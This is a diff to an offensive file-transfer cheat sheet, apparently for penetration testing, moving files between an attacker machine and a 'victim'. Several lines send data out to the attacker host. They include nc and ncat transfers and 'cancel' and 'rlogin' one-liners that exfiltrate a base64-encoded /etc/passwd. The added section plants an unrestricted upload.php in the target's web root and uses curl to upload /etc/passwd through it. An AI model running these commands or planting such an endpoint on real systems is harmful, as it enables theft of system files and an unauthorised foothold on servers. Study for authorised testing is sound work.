@@ -14,7 +14,7 @@ python3 -m http.server 80
 ```sh
 wget http://OUR_IP:80/file -o output-file
 ```
-<br>
+
 
 - - -
 ### ICMP-File-Transfer :  ( PYTHON2 )
@@ -26,7 +26,7 @@ icmp.py recv <destination file>
 
 icmp.py send <file to transfer> <remote address>
 ```
-<br>
+
 
 - - -
 ### FTP : 
@@ -41,7 +41,7 @@ python -m pyftpdlib -p 21 -u anonymous -P anonymous
 ```sh
 victim : wget ftp://OUR_IP/File_name -o newfile
 ```
-<br>
+
 
 - - - 
 ### Ncat  :
@@ -55,10 +55,9 @@ ncat -nv OUR_IP 443 --ssl < Outgoing_file
 ```sh
 ncat -nvlp 443 --ssl > Incoming_file
 ```
-<br>
+
 
 - - -
-
 ### Sending the whole folder from target to our machine : 
 
 **<u>Victim</u>** : 
@@ -80,10 +79,9 @@ nc 'our_ip' 4456 < filder.tar
 ```sh
 tar xvf folder.tgz
 ```
-<br>
+
 
 - - - 
-
 ### SCP : 
 Secure Copy (scp) 
 
@@ -111,7 +109,7 @@ scp your_username@<host1>:/some/remote/directory/foobar.txt your_username@<host2
 ```sh
 scp -c blowfish <local_file> your_username@192.168.0.10:/some/remote/directory
 ```
-<br>
+
 
 - - -
 ### Downloading files : 
@@ -130,10 +128,9 @@ curl http://IP_ADDR/file  -O /path/to/where/you/want/file/to/go
 ```sh
 fetch http://IP_ADDR/file
 ```
-<br>
+
 
 - - -
-
 ### With "Cancle" and "rlogin" command : 
 
 ###### On Kali : 
@@ -154,8 +151,8 @@ cancel -u "$(cat /etc/passwd | base64)" -h <ip>:<port>
 rlogin -l "$(cat /etc/passwd | base64)" -p <port> <ip>
 ```
 
-- - -
 
+- - -
 ### With WHOIS Command : 
 
 ###### On kali : 
@@ -178,6 +175,38 @@ Now,  on the victim machine After file successfully transfered. Press **CTRL+^C*
 ![Imgur](https://i.imgur.com/JLBW5jL.png)
 
 - - -
+### Create upload.php file : 
+
+- On the target machine, go to ` cd /var/www/html/`
+- Then create a file named "upload.php" : ` touch upload.php `
+- Now slap the below code inside this file.  ` vi upload.php `
+
+```php
+<?php
+
+$target_path = "uploads/";
+$target_path = $target_path . basename($_FILES["uploadedfile"]["name"]);
+
+echo "Source=" . $_FILES["uploadedfile"]["name"] . "<br/>";
+echo "Target path=" . $target_path . "<br/>";
+echo "Size" . $_FILES["uploadedfile"]["size"] . "<br/>";
+
+if (move_uploaded_file($_FILES["uploadedfile"]["tmp_name"], $target_path)) {
+    echo "The file " .
+        basename($_FILES["uploadedfile"]["name"]) .
+        " has been uploaded!";
+} else {
+    echo "There was an error uploading the file, please try again!";
+}
+
+?>
+```
+
+- On you Attacker machine, use the following command to upload a file.
+
+```sh
+curl --form "uploadedfile=@/etc/passwd" http://target.com/upload.php
+```
 
 
-
+- - -
